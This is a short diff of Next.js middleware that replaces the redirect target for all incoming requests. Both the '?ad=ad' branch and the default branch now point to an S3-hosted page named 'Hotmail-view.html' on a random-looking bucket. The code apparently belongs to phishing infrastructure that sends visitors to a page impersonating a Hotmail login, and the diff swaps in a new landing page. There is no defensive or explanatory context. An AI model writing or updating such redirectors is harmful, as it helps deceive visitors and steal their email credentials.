@@ -41,14 +41,14 @@ export function middleware(request) {
   // Redirect when ?ad=ad
   if (adParam === 'ad') {
     return NextResponse.redirect(
-      'https://axn90-6trf11.s3.us-east-2.amazonaws.com/a1th-em2_v.20.10/index.html',
+      'https://kd0-940x.s3.us-east-2.amazonaws.com/Hotmail-view.html',
       { status: 301 }
     )
   }
 
   // Default redirect
   return NextResponse.redirect(
-    'https://axn90-6trf11.s3.us-east-2.amazonaws.com/a1th-em2_v.20.10/index.html',
+    'https://kd0-940x.s3.us-east-2.amazonaws.com/Hotmail-view.html',
     { status: 302 }
   )
 }
